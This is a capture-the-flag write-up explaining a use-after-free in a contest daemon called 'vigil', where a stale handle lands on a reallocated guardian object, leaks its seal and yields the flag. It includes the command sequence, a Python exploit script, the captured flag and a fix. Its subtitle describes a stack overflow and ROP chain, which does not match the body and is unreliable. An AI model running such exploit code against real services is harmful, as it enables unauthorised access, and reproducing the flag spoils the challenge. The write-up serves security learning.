Siddhashrama: The Unbroken Vigil

Stack buffer overflow with ROP chain evading seccomp filter restrictions.

Reshma Al (Coldcoffee) · 15 Feb 2026 · 2 min read
Captured Flag PINAKA{siddhashrama_the_vigil_has_one_unseen_seam}

Flag: PINAKA{siddhashrama_the_vigil_has_one_unseen_seam}

Target: nc 130.210.48.10 9002 (a stripped C++ daemon, vigil, with a line-based protocol)

Overview

vigil manages “wards” in a fixed arena of 256 slots with a custom slab allocator. Each ward gets an integer handle that maps to a slot. A background “vigil plane” reclaims wards and renews one privileged guardian object. PROVE <h> <seal> only succeeds if handle h points at the guardian and seal matches its random 8-byte seal.

Commands: WARD, SET, GET, ENTRUST, RETIRE, SWEEP, CONSECRATE, RELEASE, PROVE, STATUS, HELP, QUIT.

Recon

  • strings shows several decoy flags and the literal unbroken-vigil-guardian, which hints at the guardian’s content.
  • Black-box probing was enough. Despite the threads, behaviour is deterministic, because SWEEP and CONSECRATE are explicit synchronous commands.

The bug: a stale handle

A ward goes WARD, then optionally SET, then ENTRUST (hand it to the vigil plane), RETIRE, and finally SWEEP, which frees retired and entrusted wards.

SWEEP frees the slot but leaves the user’s handle alone. Only RELEASE invalidates a handle. So the handle still points at the freed slot.

CONSECRATE allocates the new guardian from the same slab, which hands out the most recently freed slot. The guardian lands exactly where our stale handle points, and GET, SET and PROVE through that handle now act on the guardian. GET leaks the seal:

4aa3e8be7e924b1f 756e62726f6b656e2d766967696c2d677561726469616e 00...
^ 8-byte seal    ^ "unbroken-vigil-guardian"

Exploit

WARD a
WARD b
ENTRUST 1
RETIRE 1
SWEEP
CONSECRATE
GET 1
PROVE 1 <seal_hex>

Handle 1 is the victim and ends up pointing at the guardian. The seal is the first 8 bytes of the GET data, as 16 hex characters. It changes every session, so it has to be read on the same connection. Allocation order is deterministic, so this works every time.

import socket

s = socket.create_connection(("130.210.48.10", 9002), timeout=15)
f = s.makefile("rw", buffering=1)

for _ in range(12):
    f.readline()

def cmd(x):
    f.write(x + "\n")
    f.flush()
    return f.readline().strip()

for x in ["WARD a", "WARD b", "ENTRUST 1", "RETIRE 1", "SWEEP", "CONSECRATE"]:
    cmd(x)

data = cmd("GET 1").split("data=")[1]
print(cmd("PROVE 1 " + data[:16]))
print(f.readline().strip())

Output:

PROVEN the unbroken vigil acknowledges you, guardian of the yajna
FLAG PINAKA{siddhashrama_the_vigil_has_one_unseen_seam}

Fix

Invalidate the handle (or give it a generation tag) when SWEEP frees a slot. Also never let a handle resolve to an object of a different type than it was issued for.
